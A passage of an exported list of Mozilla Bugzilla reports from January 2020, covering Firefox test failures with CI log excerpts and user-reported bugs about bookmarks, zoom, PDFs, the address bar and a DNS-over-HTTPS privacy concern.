@chrome://mochitests/content/browser/browser/components/protections/test/browser/browser_protections_report_ui.js:222:12 [task 2020-01-16T00:00:01.193Z] 00:00:01 INFO - async*execute@resource://specialpowers/SpecialPowersSandbox.jsm:140:12 [task 2020-01-16T00:00:01.193Z] 00:"
1609588,Intermittent browser/base/content/test/tabcrashed/browser_withoutDump.js | application terminated with exit code 1,RESOLVED,P5,INCOMPLETE,"**Filed by:** dvarga [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285099795&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/UdcjEdqTRI-2DojDhC_jMw/runs/0/artifacts/public/logs/live_backing.log --- ``` [task 2020-01-15T21:09:57.359Z] 21:09:57 INFO - Buffered messages logged at 21:09:55 [task 2020-01-15T21:09:57.359Z] 21:09:57 INFO - Console message: [JavaScript Error: ""remote browser crashed while on data:text/html,<html><body>A%20regular,%20everyday,%20normal%20page. [task 2020-01-15T21:09:57.360Z] 21:09:57 INFO - "" {file: ""chrome://mochikit/content/mochitest-e10s-utils.js"" line: 10}] [task 2020-01-15T21:09:57.360Z] 21:09:57 INFO - e10s_init/<@chrome://mochikit/content/mochitest-e10s-utils.js:10:10 [task 2020-01-15T21:09:57.360Z] 21:09:57 INFO - EventListener.handleEvent*e10s_init@chrome://mochikit/content/mochitest-e10s-utils.js:6:10 [task 2020-01-15T21:09:57.360Z] 21:09:57 INFO - testInit@chrome://mochikit/content/browser-test.js:130:5 [task 2020-01-15T21:09:57.360Z] 21:09:57 INFO - setTimeout handler*@chrome://mochikit/content/browser-test.js:40:11 [task 2020-01-15T21:09:57.360Z] 21:09:57 INFO - l"
1609624,Google Maps Infowindow stopped showing,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Tried accessing a page on my company website on which Google Maps Infowindow was working fine previously. Suddenly, today we noticed that the location Infowindow no longer displays on clicking a location marker on Firefox, but they do show up on other browsers. I tried creating a jsFiddle to make sure the issue nowhere related to our website. jsFiddle: https://jsfiddle.net/shivambarve/tf9vxgja/12/ Actual results: The same behavior was seen in the jsFiddle. The Infowindow was not working there too when accessed through Firefox. Whereas, it was working when accessed through other browsers. Expected results: The Infowindow should have shown on click of the location marker."
1609635,Snippets broken in Nightly 74,VERIFIED,P1,FIXED,"#### Affected versions: Nightly 74.0a1 (2020-01-16) #### Affected platforms: ALL #### Preconditions: Have the ""browser.newtabpage.activity-stream.asrouter.devtoolsEnabled"" pref set to ""true"" in the ""about:config"" page. #### Steps: 1. Navigate to the ""about:newtab#asrouter"" page and select the ""snippets_local_testing"" from the ""Messages"" section's dropdown menu. 2. Click the ""Show"" button from the ""SIMPLE_TEST_1"" section. #### Actual result: The ""SIMPLE_TEST_1"" snippet is displayed in the bottom part of the browser but there is no hyperlink. #### Expected result: The body text of the snippet should contain a hyperlink in the right part of the firefox icon. Please see also the following bug, might be related to this issue: https://bugzilla.mozilla.org/show_bug.cgi?id=1601880 #### Regression range: Last good revision: 72bc4f39b6598b06925c9a3372a5076f5e6f78ab First bad revision: 01fde39940c3d8baa41dc747bf4454cf312be78c Pushlog: https://hg.mozilla.org/integration/autoland/pushloghtml?fromchange=72bc4f39b6598b06925c9a3372a5076f5e6f78ab&tochange=01fde39940c3d8baa41dc747bf4454cf312be78c"
1609657,Firefox does not generate an accessibility tree for PDFs,RESOLVED,P3,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: Run NVDA on Windows 10 Visit https://www.pdfa.org/wp-content/uploads/2019/09/PDF-Association-flyer-A4.pdf in Firefox - this PDF file is known to be tagged for accessibility. Use the standard keyboard input controls for browsing the document (e.g. H for headings) or inspect the Accessibility tree in the dev tools Actual results: Document semantics, aria roles, accessible names and descriptions are ignored. Dev tools > Accessibility reports the existence of a document, but not much else. It appears that Firefox is not generating an accessibility tree for PDF content, even when the PDF is tagged. Expected results: Should be able to navigate the document via its semantics (landmarks, headings etc.) exactly as you can with Adobe Acrobat (using the exact same PDF). Dev tools accessibility should map these semantics as a tree, exactly as it would with a correctly-made HTML or SVG file."
1609669,The new version of Firefox does not allow viewing pdf files; displays dialog rearding how to name the file,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I tried to open a pdf file on Firefox. Using my Windows system I did the following: - once I found the file I wanted to open, I opened a pdf file by using the open with... right click option and selecting ""Firefox""; -It opened a new tab, but nothing was shown; Actual results: The file was not displayed in the browser in the new tab, and a dialog box popped up showing the file explorer directory and asking how to save the file in my Windows machine ( I have already the file in my windows system) ; Expected results: It should have displayed the file in the new tab in Firefox."
1609687,Pressing Enter when using Bing.com doesn't start the search,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: - Launch https://www.bing.com/ - Type your search terms - Press ""Enter"" Actual results: The search didn't start. We need to click on the ""Magnifying Glass"" to get the search started. Expected results: The search should have started upon pressing the ""Enter"" key"
1609694,'Pin to the list' tooltip is not correctly positioned,RESOLVED,--,WONTFIX,"**Affected versions** * 74.0a1(1/16/2020) * 73.0b5 * 72.0.1 **Affected platforms** * Windows 7x64 **Steps to reproduce** 1. Launch Firefox on a dirty profile (or have some browser history saved before going to the next step). 2. Right click on the Firefox icon from the taskbar. 3. Hover on any website from the context menu's ""Frequent"" section. 4. Hover on the pin icon. **Expected result** * The ""Pin to the list"" tooltip is displayed correctly right beside the cursor. **Actual result** * The ""Pin to the list"" tooltip is displayed over ""Pin this program to taskbar"" option from the menu. **Regression range** * This issue is not a recent regression since I was able to reproduce it on Firefox 69.0b5. I'll come with a regression range asap. **Additional notes** * For more details, see the attached screen recording. * This issue is also reproducible with Firefox 73.0b5 Developer Edition."
1609695,"[Firefox 71] The ""Lockwise Moments Page"" is wrongly displayed for the users that are connected with a Firefox Account linked to the ""Firefox Lockwise"" mobile app",RESOLVED,--,INVALID,"**[Affected versions]:** - Firefox Release 71 **[Affected Platforms]:** - Windows 10 x64 - Mac 10.15.2 - Ubuntu 18.04 x64 **[Prerequisites]:** - Have a Firefox profile older than 30 days. - Have a Firefox Account that is linked with the Firefox Lockwise app. - Have the environment set to ""Stage"" using the ""Remote Settings Devtools"" add-on (1.2.0) installed from [here](https://github.com/mozilla/remote-settings-devtools/releases). **[Steps to reproduce]:** 1. Open the browser with the profile from prerequisites. 2. Click the ""Firefox Account"" toolbar and log in with the account from prerequisites. 3. Restart the browser and wait ~10 minutes. 4. Restart the browser and observe the behavior. **[Expected result]:** - The browser is successfully restarted and no other page is opened. **[Actual result]:** - The browser is restarted and the ""Lockwise Moments Page"" is also opened. **[Notes]:** - This issue is not reproducible with the latest Firefox Release 72.0.1, latest Firefox Beta 73.0b5, or with the latest Firefox Nightly 74.0a1."
1609699,Rename browser.urlbar.searchTips pref to browser.urlbar.update1.searchTips,RESOLVED,P1,FIXED,
1609713,[Regression] Gah. Your tab just crashed. + Firefox has just been updated in the background. Click Restart Firefox to complete the update.,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36 Steps to reproduce: upgrade from 69* to any newer version, either packaged one via os updates or tar.bz2 downloaded from mozilla website *version 69.0.3+build1-0ubuntu1 in ubuntu 19.10 eoan amd64 ubuntu@wsl1:~/nightly/firefox$ apt policy firefox firefox: Installed: 69.0.3+build1-0ubuntu1 Candidate: 72.0.1+build1-0ubuntu0.19.10.1 Version table: 72.0.1+build1-0ubuntu0.19.10.1 500 500 http://archive.ubuntu.com/ubuntu eoan-updates/main amd64 Packages 500 http://security.ubuntu.com/ubuntu eoan-security/main amd64 Packages *** 69.0.3+build1-0ubuntu1 500 500 http://archive.ubuntu.com/ubuntu eoan/main amd64 Packages 100 /var/lib/dpkg/status it does not matter if I create a fresh profile, same results, any version above 69 behaves the same Actual results: firefox shows messages: 1. in a separate tab: Nightly has just been updated in the background. Click Restart Nightly to complete the update. 2. in other tab: Gah. Your tab just crashed. Expected results: just keep working"
1609725,Desktop Firefox - users accessing any website with DNS-Over-HTTPS enabled are vulnerable to a Web Activity leakage through HTTP Requests,RESOLVED,--,INVALID,"From bug 1609329 comment 4, reported by ""rgfulw"": After some research, this issue also affects Desktop platforms. 'HTTPS Everywhere' was just encrypting the HTTP request. Resolved by temp disabling the add-on. The HTTP request is not sent when modifying the URL address on the same tab, only when the user opens another tab and enters an address. This will explain why the success rate was not 100%. Something interesting, the HTTP request does not send if user manually enters 'HTTPS://' before URL. If user simply enters 'test.com' then the HTTP request is sent disclosing the DNS hostname inside, even though user has DoH enabled. If the user enters 'https://test.com' then the HTTP request is not sent, or maybe just encrypted. Again, no other tested Desktop browsers display this behaviour. Debian & Windows tested, MacOS to be tested. WINDOWS DEMO: - Using Firefox 72.0.1 *DoH Disabled* Step 1.) Setting up listener with Wireshark. [0:00 - 0:10sec] Step 2.) User opens Firefox and accesses site 'duckduckgo.com'. [0:10 - 0:14sec] Step 3.) Stop packet capture, view captured data. [0:14 - 0:19sec] Step 4.) Proof DNS requests are unencrypted, and HTTP request is sent. [0:19 - 0:29sec] *DoH Enab"
1609740,"Redhat Linux EL 6.10 Firefox v68, Set as Desktop Background not working - Dialog appears and allows but image not actually set",UNCONFIRMED,P3,,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: run Firefox, searched for desktop backgrounds, pulled up the page with an image I liked, right clicked on image and selected Set as Desktop Background. The dialog pops up where you can set the position and color. Clicked on Set as Desktop Background button on the dialog. Actual results: Nothing, the dialog goes away and the desktop background is not set. Expected results: The image should have been set as the background image for the desktop."
1609759,"Can not edit or delete bookmarks, no error msg",RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: First I tried to delete a bookmark from my Bm toolbar: right click -> delete. Nothing happened. Then I tried to edit properties of the same bookmark (right click -> properties). I got the Edit popup filled with the data of my bookmark, I edited and clicked Save, the Edit popup gone and again: nothing happened. Also tried to do it on several bookmarks and from the Top menu -> Bookmarks but no luck. I don't get any error message. I'm on FF 72.0.1 x64 on latest Win 10 Ent. Actual results: Nothing. I mean, the bookmark I wanted to delete or modify is still there untouched and I didn't get any error message. Expected results: Bookmarks should be removed or edited."
1609766,Signed in to Sync and Confirmed my Email - Still asking me to confirm,RESOLVED,--,DUPLICATE,"Firefox 73.0b5 (64-bit) on Mac *Steps to reproduce* - Installed with new profile - Instead of registering on about:welcome, I chose to register via the account toolbar menu. - I confirmed my email - I was redirected to https://www.mozilla.org/en-CA/firefox/accounts/ as expected Expected result: - Browser is in a verified state Actual result: - Browser state remains in an unverified state (I've waited about 10 mins to see if it would change) Attached is a screenshot of the page users see after a completed registration but with my browser remaining unverified."
1609777,"When Bookmark Tree Not Displaying, Bookmark Folder Abruptly Changes On Own",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Hit Ctrl-D to bookmark, causing dialog to appear beneath star. Actual results: Folder literally changes on its own from ""Other Bookmarks"" to an existing folder without any input. If I navigate to that field and try to change it back, it will, usually within less than a second, change back to an existing folder. Expected results: Folder should remain on ""Other Bookmarks."" Additional notations: (1) I have tried Safe Mode as well as simply removing all extensions. I have tried saving bookmarks to HTML, deleting bookmark files, deleting my Firefox Sync account (I have a phone install, a work install, and a home install), and restoring from the HTML backup. Unless I've somehow made a mistake in that process, it didn't work. (2) At one point, I used the Firefox recommended extension ""Default Bookmark Folder"". When these problems began, I uninstalled it in case it was the source of the problem. It has no effect in repairing this issue. (3) The problem does not occur if the bookmark tree is expanded. (4) The problem seems not to occur if the bookmark is NOT made via the dialog tha"
1609808,Intermittent browser/components/newtab/test/browser/browser_onboarding_rtamo.js | Should render .ReturnToAMOOverlay - null == true -,RESOLVED,P1,DUPLICATE,"**Filed by:** ncsoregi [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285252537&repo=mozilla-release **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/Tsi9tDnWTK-YTebhhTkCQA/runs/0/artifacts/public/logs/live_backing.log --- >[task 2020-01-16T21:02:29.626Z] 21:02:29 INFO - TEST-PASS | browser/components/newtab/test/browser/browser_onboarding_rtamo.js | Attribution data should be set - ""addons.mozilla.org"" == ""addons.mozilla.org"" - [task 2020-01-16T21:02:29.626Z] 21:02:29 INFO - Console message: [JavaScript Error: ""Unknown Collection ""main/whats-new-panel"""" {file: ""resource://services-settings/RemoteSettingsClient.jsm"" line: 172}] [task 2020-01-16T21:02:29.626Z] 21:02:29 INFO - UnknownCollectionError@resource://services-settings/RemoteSettingsClient.jsm:172:5 [task 2020-01-16T21:02:29.626Z] 21:02:29 INFO - sync@resource://services-settings/RemoteSettingsClient.jsm:408:13 [task 2020-01-16T21:02:29.626Z] 21:02:29 INFO - [task 2020-01-16T21:02:29.627Z] 21:02:29 INFO - Buffered messages finished [task 2020-01-16T21:02:29.627Z] 21:02:29 INFO - TEST-UNEXPECTED-FAIL | browser/components/newtab/test/browser/browser_onboarding_r"
1609880,No indication why global/default zoom does not work with privacy.resistFingerprinting enabled,RESOLVED,P5,FIXED,"STR: 1. Enable `privacy.resistFingerprinting`. 2. Go to `about:preferences` and change the ""Default zoom"" setting (introduced in 73) to something other than 100%. Expected: Default zoom works or some explanation why it doesn't. Actual: Default zoom fails without explanation."
1609898,about:downloads shows an XML error,RESOLVED,--,FIXED,"Mozilla/5.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 ID:20200116120508 The about:downlads page shows an XML error: ``` Erreur d’analyse XML : préfixe non lié à un espace de noms Emplacement : about:downloads Numéro de ligne 27, Colonne 5 : <html:link rel=""localization"" href=""toolkit/global/textActions.ftl""/> ----^ ``` Probably a recent regression."
1609904,No View Certificate button,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Open https://am-sola.gov.si/AM.webservices/services/VirWs Actual results: There is no ""View Certificate"" button in the Security tab of the Page Info dialog. Can not check the site certificate. Expected results: View Certificate button present and working"
1609906,Add automated test that exercises about:downloads,RESOLVED,P1,FIXED,We completely broke about:downloads and didn't notice. We should fix that.
1609910,Changing full-screen-api.transition-duration.leave to 0 0 in about:config causes Firefox to freeze when exiting full screen video.,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: After updating to 72.0.1 I noticed that when I try to exit from a video which is in full screen, Firefox would freeze. It usually doesn't happen on the ""first exit"" to original mode but definitely after second or third. Actual results: My settings in about:config regarding full screen warning and transition, were all set to 0 or 00 for the last couple of years. After this issue started occurring, I started toggling each setting and I noticed that full-screen-api.transition-duration.leave was the culprit. All other settings were left at 0. Exiting video from full screen does not freeze on exit only if full-screen-api.transition-duration.leave is set to 1 1 or higher. Zero and anything lower, causes the whole computer to freeze. Task manager or any windows shortcuts do not appear and the only solution is to physically force shut down the computer. I tested this on two different computers both running latest version of Windows 10. Expected results: I tried installing a new Firefox beta version with new profile, disabled hardware acceleration etc. but as soon as I changed abov"
1609922,Add mochitest for end to end snippets rendering test,RESOLVED,P1,FIXED,"Follow up of bug 1609635, we need mochitests that catch snippets rendering regressions."
1610008,Scrollbars on plain HTML pages don't react on mouse clicks,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Open a long plain HTML page without styles. Actual results: Clicking on vertical scrollbar buttons don't scroll page by one line. Clicking on vertical scrollbar area outside of bar don't scroll page by one screen. Click and drag of scrollbar bar select text instead. Expected results: Clicking of buttons or should scroll the page by one line. Clicking to scrollbar area outside of bar should scroll page more. Dragging of bar should scroll page.
1610019,A tab being pinned causes New tab button to overlap tab bar scroll button when window is very narrow,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Open a few tabs, pin one, then resize the window to be as narrow as possible. Notice the New tab button and the right tab bar scroll button are overlapping. If you have no pinned tabs, the problem goes away. Please see attached screenshot"
1610024,"The ""Redirect"" tip is not triggered in the next session if you previously dismiss it temporarily and perform a search in another tab",VERIFIED,P2,FIXED,"+++ This bug was initially created as a clone of Bug #1605738 +++ We wontfixed bug 1605738 for the tips experiment, but we may want to fix it for the tips implementation in the product. Or maybe not, but I just wanted to file this bug so we don't forget to consider it. Relevant parts of the original bug below. See also the discussion there. ----- [Steps to reproduce]: 1. Open Firefox with the profile from prerequisites. 2. In an already opened tab navigate to https://www.google.com/ page. 3. Click anywhere on the page in order to dismiss the tip. 4. In another opened tab, perform a search using the address bar. 5. Restart the browser. 6. In an already opened tab navigate to https://www.google.com/ page. 7. Observe what happens next. [Expected result]: - The “Redirect” tip is displayed. [Actual result]: - The “Redirect” tip is not displayed. [Notes]: - This issue is also reproducible with the other supported search engines: Bing and DucDuckGo. - This issue is not reproducible if, at step 4, you delete the existing URL, unfocus the address bar and only after that you perform a search. - Attached a screen recording with the issue."
1610031,"Firefox retries resolving a nonexistent TLD to find a `.com` address, resulting in unexpected redirects",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15 Steps to reproduce: Entered www.cityofchicago in address bar Actual results: Firefox resolved to https://www.homevalueleads.com/cancelled/ Expected results: Sever error page"
1610042,ETP shield missing in the url,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: Followed below 2 steps twice : Part a. With the study inactive, go to Preferences > Privacy & Security > Enhanced Tracking Protection > Custom > Cookies > All cookies Then the page should say: ``` Treatment Branch: Cookies BLOCKED Control Branch: Cookies BLOCKED ``` Part b. Now click on the ETP Shield in the URL bar and hit the toggle switch to disable tracking protection for the site. Now the page should say ``` Treatment Branch: Cookies not blocked Control Branch: Cookies not blocked Actual results: It seemed to work as expected for couple times. When I attempted (3rd time) to switch back and forth (Part a vs Part b) I’m no longer seeing the ETP shield in url."
1610043,"Intermittent browser/extensions/doh-rollout/test/browser/browser_policyOverride.js | Uncaught exception - at mochitests/content/browser/browser/extensions/doh-rollout/test/browser/head.js:73 - TypeError: can't access property ""filter"", events is undefined",RESOLVED,P5,FIXED,"**Filed by:** csabou [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285398186&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/Kn-uZhsaT9mYsN4sEvayQg/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-17T17:44:06.914Z] 17:44:06 INFO - TEST-PASS | browser/extensions/doh-rollout/test/browser/browser_policyOverride.js | No change in TRR mode - [task 2020-01-17T17:44:06.914Z] 17:44:06 INFO - Buffered messages finished [task 2020-01-17T17:44:06.914Z] 17:44:06 INFO - TEST-UNEXPECTED-FAIL | browser/extensions/doh-rollout/test/browser/browser_policyOverride.js | Uncaught exception - at chrome://mochitests/content/browser/browser/extensions/doh-rollout/test/browser/head.js:73 - TypeError: can't access property ""filter"", events is undefined [task 2020-01-17T17:44:06.914Z] 17:44:06 INFO - Stack trace: [task 2020-01-17T17:44:06.914Z] 17:44:06 INFO - checkHeuristicsTelemetry@chrome://mochitests/content/browser/browser/extensions/doh-rollout/test/browser/head.js:73:3 [task 2020-01-17T17:44:06.915Z] 17:44:06 INFO - testPolicyOverride@chrome://mochitests/content/browser/browser/extensions/doh-rollout/test/"
1610068,Intermittent Tier 2 toolkit/components/thumbnails/test/browser_thumbnails_bug818225.js | Uncaught exception received from previously timed out test - Waiting for http://*/background_red.html?1579305318354 to exist. - threw exception: ReferenceError: PageT,RESOLVED,P5,INCOMPLETE,"**Filed by:** btara [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285445236&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/cN0oDCm9QG6Mv_FfFM9REg/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-17T23:55:18.358Z] 23:55:18 INFO - TEST-START | toolkit/components/thumbnails/test/browser_thumbnails_bug818225.js [task 2020-01-17T23:56:03.363Z] 23:56:03 INFO - TEST-INFO | started process screenshot [task 2020-01-17T23:56:03.422Z] 23:56:03 INFO - TEST-INFO | screenshot: exit 0 [task 2020-01-17T23:56:03.422Z] 23:56:03 INFO - Buffered messages logged at 23:55:18 [task 2020-01-17T23:56:03.422Z] 23:56:03 INFO - Entering test bound thumbnails_bg_bug818225 [task 2020-01-17T23:56:03.422Z] 23:56:03 INFO - TEST-PASS | toolkit/components/thumbnails/test/browser_thumbnails_bug818225.js | Thumbnail file does not exist - [task 2020-01-17T23:56:03.422Z] 23:56:03 INFO - Console message: [JavaScript Error: ""The character encoding of the HTML document was not declared. The document will render with garbled text in some browser configurations if the document contains characters from outside the US-ASCII"
1610081,The non-scrolling sidebar in about:addons and about:preferences is a potential migraine trigger,VERIFIED,P3,FIXED,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Used about:addons Actual results: It has a sidebar which does no scroll with the rest of the page. It's not as bad as most pages with this layout, but it's still a potential migraine trigger and/or aggravator. Right now, the non-scrolling sidebar and scrolling add-on list are next to each other on the left side of the window. Maybe it would work better if they were on opposite sides of the window, space permitting."
1610097,Intermittent TV browser/extensions/doh-rollout/test/browser/browser_dirtyEnable.js | Uncaught exception - undefined - timed out after 50 tries.,RESOLVED,P5,INCOMPLETE,**Filed by:** ccoroiu [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285463735&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/HHr4FoNqQsOFT5uFifJQ2A/runs/0/artifacts/public/logs/live_backing.log **Reftest URL:** https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/HHr4FoNqQsOFT5uFifJQ2A/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1 --- [task 2020-01-18T05:26:37.739Z] 05:26:37 INFO - TEST-START | browser/extensions/doh-rollout/test/browser/browser_dirtyEnable.js [task 2020-01-18T05:26:42.881Z] 05:26:42 INFO - TEST-INFO | started process screentopng [task 2020-01-18T05:26:43.170Z] 05:26:43 INFO - TEST-INFO | screentopng: exit 0 [task 2020-01-18T05:26:43.171Z] 05:26:43 INFO - Buffered messages logged at 05:26:37 [task 2020-01-18T05:26:43.171Z] 05:26:43 INFO - Entering test bound testDirtyEnable [task 2020-01-18T05:26:43.171Z] 05:26:43 INFO - Buffered messages finished [task 2020-01-18T05:26:43.172Z] 05:26:43 INFO - TEST-UNEXPECTED-FAIL | browser/extensions/doh-rollo
1610122,"Global zoom does not inherit setting from Windows 10 Display ""Make text bigger"" setting",RESOLVED,--,DUPLICATE,"From: https://www.reddit.com/r/firefox/comments/eq83u5/would_you_fund_specific_features_in_firefox_on/fesimb2/ Steps to reproduce: 1. Go to Start > Settings > Ease of Access > Display 2. Set ""Make text bigger"" setting to 200%. Apply. 3. Open Firefox and open any web page What happens: Page zoom is the default. Expected result: The page zoom should be set to 200%. Some observations vs. Chromium -- In Chromium, it is page zoom, not text size zoom that is applied. Setting a page zoom in Chromium setting while the Windows ""make text bigger"" setting is applied seems to make the windows setting the base (100%) setting, then the Chromium setting applies the Chromium zoom against it. For example, setting Windows to 200% and Chromium to 50% seems to end up at 100% in the page, while browser chrome is still 200%. While Chromium respects the Windows ""make text bigger"" setting, no preference is modified in the Chromium UI, so for example, setting 200% in Windows doesn't set the Chromium UI setting to 200%."
1610123,Saving screenshots uses jpg/png output format inconsistently,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: - Take a number of screenshots of a webpage using the ""Take a Screenshot"" > ""Download"" tool. Actual results: Resulting files are - Screenshot_YYYY_MM_DD Screenshot.png - Screenshot_YYYY_MM_DD Screenshot.jpg - Screenshot_YYYY_MM_DD Screenshot (1).png - Screenshot_YYYY_MM_DD Screenshot (1).jpg - ... Note that they do not alternate, nor are the png / jpg different formats of the same image. To evidence this, observe the creation date of a number of screenshots I took sequentially this morning: -rw-r--r-- 1 ojensen ojensen 452357 Jan 18 10:45 'Screenshot_2020-01-18 Screenshot(1).jpg' -rw-r--r-- 1 ojensen ojensen 1734749 Jan 18 10:50 'Screenshot_2020-01-18 Screenshot(1).png' -rw-r--r-- 1 ojensen ojensen 445709 Jan 18 10:50 'Screenshot_2020-01-18 Screenshot(2).jpg' -rw-r--r-- 1 ojensen ojensen 1551768 Jan 18 10:51 'Screenshot_2020-01-18 Screenshot(2).png' -rw-r--r-- 1 ojensen ojensen 378572 Jan 18 10:54 'Screenshot_2020-01-18 Screenshot(3).jpg' -rw-r--r-- 1 ojensen ojensen 1503066 Jan 18 10:51 'Screenshot_2020-01-18 Screenshot(3).png' -rw-r--r-- 1 ojensen ojensen 376493 Jan 18 10:55 'Scre"
1610125,Intermittent browser/components/urlbar/tests/browser/browser_caret_navigation.js | KEY_ArrowDown: Heuristic result should be selected - -1 == 0 - JS frame,RESOLVED,P5,INCOMPLETE,**Filed by:** apavel [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285500910&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/DThR388TQaCIyuug8oOq4A/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-18T18:02:15.798Z] 18:02:15 INFO - TEST-START | browser/components/urlbar/tests/browser/browser_caret_navigation.js [task 2020-01-18T18:02:16.050Z] 18:02:16 INFO - TEST-INFO | started process screenshot [task 2020-01-18T18:02:16.291Z] 18:02:16 INFO - TEST-INFO | screenshot: exit 0 [task 2020-01-18T18:02:16.292Z] 18:02:16 INFO - Buffered messages logged at 18:02:15 [task 2020-01-18T18:02:16.292Z] 18:02:16 INFO - Entering test bound [task 2020-01-18T18:02:16.293Z] 18:02:16 INFO - TEST-PASS | browser/components/urlbar/tests/browser/browser_caret_navigation.js | KEY_ArrowDown: Should have started a query - true == true - [task 2020-01-18T18:02:16.293Z] 18:02:16 INFO - Buffered messages finished [task 2020-01-18T18:02:16.293Z] 18:02:16 INFO - TEST-UNEXPECTED-FAIL | browser/components/urlbar/tests/browser/browser_caret_navigation.js | KEY_ArrowDown: Heuristic result should be selected - -1 == 0 - JS 
1610129,New tabs opens a new window instead,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: When opening a new tab Firefox it also opens a new window and copies all the tabs from the previous window. Eventually I get a 'chain' of windows open. If I close the other windows it then also closes down all the tabs in the other windows, effectively closing the page I had open. This is also non surprisingly slowing down my machine. I'm someone that works with several tabs open, and now this is proving impossible. Actual results: Upon a cold reinstall using an older version it worked normally again until it updated itself, then it returned to opening a new window for each new tab, plus copies of the tabs open in the previous window. This bug seems to be related to the latest version of Firefox. Expected results: I have followed all checks to settings. All options are correct. All settings 'under the bonnet' are correct. All settings in about:config are correct. I have followed all the fix steps available as its been reported as a bug before. None of it has worked. It also 'forgets' my previous sessions if I don't shut the correct windows before logging out. This is very "
1610130,Address bar tries to resolve impossible top-level-domains,RESOLVED,--,DUPLICATE,"Mozilla/5.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: 1. Copy `subprocess.rn!'{}+()n` into you address bar and hit enter. Observed behaviour: Firefox unsuccessfully tries to resolve the URL thinking that `.rn!'{}+()n` is a valid TLD. Expected behaviour: Since the TLD contains non-alphanumeric characters, trigger a search."
1610139,Page Notifications should not appear inside content window or pop-over,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: I went to a website that is trying to tell me about notifications (I disabled the misfeature since then so I can't reproduce). Actual results: A window appeared stuck to the bottom of the address bar, but was entirely within the content window of the browser, so the browser was saying/(behaving as if) that it was internal to the webpage and had nothing to do with the browser. Expected results: If people want to let web pages outside of the confines of a browser, a small icon in the address bar would suffice to let us know that notification services are available for this website. It is NOT ok to violate the browser/content barrier.. in normal operation. This is a security problem that could harm a lot of people, but it's one that people should know about."
